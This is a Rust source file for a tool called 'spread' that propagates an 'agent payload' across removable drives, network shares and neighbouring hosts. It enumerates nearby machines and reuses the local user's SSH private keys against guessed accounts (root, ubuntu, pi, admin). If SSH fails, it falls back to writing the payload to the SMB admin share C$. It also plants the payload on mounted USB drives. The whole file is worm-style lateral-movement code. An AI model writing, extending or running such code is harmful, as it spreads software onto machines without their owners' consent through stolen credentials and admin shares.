//! Spread the agent payload to removable drives, shares, and SSH-reachable hosts.

use std::{fs, path::PathBuf, time::Duration};

use clap::{Parser, ValueEnum};
use serde_json::json;
use spread::{lan, stage, usb, Outcome, Payload};

#[derive(Copy, Clone, Debug, ValueEnum)]
enum Mode {
    Usb,
    Lan,
    Shares,
    All,
}

#[derive(Parser, Debug)]
#[command(about = "Stage the agent payload on removable drives and nearby hosts")]
struct Cli {
    /// State directory (staging lives here).
    #[arg(long, default_value = ".agent-fleet")]
    state: PathBuf,
    /// Payload directory: agentd, enc.key, config.toml, ideally enrolment.grant.
    #[arg(long)]
    payload: PathBuf,
    /// What to spread to.
    #[arg(long, value_enum, default_value_t = Mode::All)]
    mode: Mode,
    /// Explicit mount directory (repeatable).
    #[arg(long = "mount-root")]
    mount_root: Vec<PathBuf>,
    /// Explicit share directory (repeatable).
    #[arg(long)]
    share: Vec<PathBuf>,
    /// SSH private key (repeatable; defaults to ~/.ssh/id_ed25519 and id_rsa).
    #[arg(long)]
    key: Vec<PathBuf>,
    /// SSH user (repeatable; current user and common names are tried too).
    #[arg(long)]
    user: Vec<String>,
    /// Neighbour cap.
    #[arg(long, default_value_t = 32)]
    max_hosts: usize,
    /// SSH port to probe (the fake ssh script ignores it in tests).
    #[arg(long, default_value_t = 22)]
    port: u16,
    /// SMB account for the admin-share drop.
    #[arg(long)]
    smb_user: Option<String>,
    /// SMB password.
    #[arg(long)]
    smb_pass: Option<String>,
    /// SMB port to probe.
    #[arg(long, default_value_t = 445)]
    smb_port: u16,
    /// SMB share to write (default `C$`).
    #[arg(long, default_value = "C$")]
    smb_share: String,
    /// Re-stage an already marked target.
    #[arg(long)]
    force: bool,
    /// Print the plan without copying or connecting.
    #[arg(long)]
    dry_run: bool,
}

fn keys(cli: &Cli) -> Vec<PathBuf> {
    if !cli.key.is_empty() {
        return cli.key.clone();
    }
    let Some(home) = std::env::var_os("HOME").map(PathBuf::from) else {
        return Vec::new();
    };
    [home.join(".ssh/id_ed25519"), home.join(".ssh/id_rsa")]
        .into_iter()
        .filter(|path| path.is_file())
        .collect()
}

fn users(cli: &Cli) -> Vec<String> {
    let mut users = cli.user.clone();
    if let Ok(user) = std::env::var("USER").or_else(|_| std::env::var("USERNAME")) {
        users.push(user);
    }
    for common in ["root", "ubuntu", "pi", "admin", "debian"] {
        users.push(common.into());
    }
    users.sort();
    users.dedup();
    users
}

fn main() {
    let cli = Cli::parse();
    let payload = match Payload::load(&cli.payload) {
        Ok(payload) => payload,
        Err(error) => {
            eprintln!("spread: {error}");
            std::process::exit(2);
        }
    };
    let mut usb_outcomes = Vec::new();
    let mut lan_outcomes = Vec::new();
    let mut share_outcomes = Vec::new();
    let do_usb = matches!(cli.mode, Mode::Usb | Mode::All);
    let do_lan = matches!(cli.mode, Mode::Lan | Mode::All);
    let do_shares = matches!(cli.mode, Mode::Shares | Mode::All);

    if cli.dry_run {
        if do_usb {
            for mount in usb::mounts(&cli.mount_root) {
                usb_outcomes.push(Outcome::skipped(mount.display().to_string(), "dry run"));
            }
        }
        if do_shares {
            for share in lan::shares(&cli.share) {
                share_outcomes.push(Outcome::skipped(share.display().to_string(), "dry run"));
            }
        }
        if do_lan {
            for host in lan::neighbors().into_iter().take(cli.max_hosts) {
                let ssh = lan::probe(&host, cli.port, Duration::from_millis(400));
                let smb = lan::probe(&host, cli.smb_port, Duration::from_millis(400));
                lan_outcomes.push(Outcome::skipped(
                    host,
                    format!("dry run, ssh={ssh} smb={smb}"),
                ));
            }
        }
        print(&usb_outcomes, &lan_outcomes, &share_outcomes);
        return;
    }

    let staging = cli
        .state
        .join(format!("spread-stage-{}", std::process::id()));
    if do_lan {
        let _ = fs::create_dir_all(&staging);
        if let Err(error) = stage(&staging, &payload, true) {
            eprintln!("spread: staging failed: {error}");
            std::process::exit(1);
        }
    }

    if do_usb {
        for mount in usb::mounts(&cli.mount_root) {
            match stage(&mount, &payload, cli.force) {
                Ok(outcome) => usb_outcomes.push(outcome),
                Err(error) => usb_outcomes.push(Outcome::error(
                    mount.display().to_string(),
                    error.to_string(),
                )),
            }
        }
    }
    if do_shares {
        for share in lan::shares(&cli.share) {
            share_outcomes.push(lan::stage_share(&share, &payload));
        }
    }
    if do_lan {
        let keys = keys(&cli);
        let users = users(&cli);
        let smb = lan::Smb {
            user: cli
                .smb_user
                .clone()
                .or_else(|| std::env::var("SMB_USER").ok())
                .unwrap_or_default(),
            pass: cli
                .smb_pass
                .clone()
                .or_else(|| std::env::var("SMB_PASS").ok())
                .unwrap_or_default(),
            share: cli.smb_share.clone(),
        };
        for host in lan::neighbors().into_iter().take(cli.max_hosts) {
            let outcome = if keys.is_empty() {
                lan::smb_host(&host, cli.smb_port, &payload, &staging, &smb)
            } else {
                let ssh = lan::ssh_host(&host, cli.port, &payload, &keys, &users, &staging);
                if ssh.status == "skipped" {
                    lan::smb_host(&host, cli.smb_port, &payload, &staging, &smb)
                } else {
                    ssh
                }
            };
            lan_outcomes.push(outcome);
        }
    }

    if do_lan {
        let _ = fs::remove_dir_all(&staging);
    }
    let failed = usb_outcomes
        .iter()
        .chain(&lan_outcomes)
        .chain(&share_outcomes)
        .any(|outcome| outcome.status == "error");
    print(&usb_outcomes, &lan_outcomes, &share_outcomes);
    if failed {
        std::process::exit(1);
    }
}

fn print(usb_outcomes: &[Outcome], lan_outcomes: &[Outcome], share_outcomes: &[Outcome]) {
    println!(
        "{}",
        json!({
            "ok": true,
            "usb": usb_outcomes,
            "lan": lan_outcomes,
            "shares": share_outcomes,
        })
    );
}
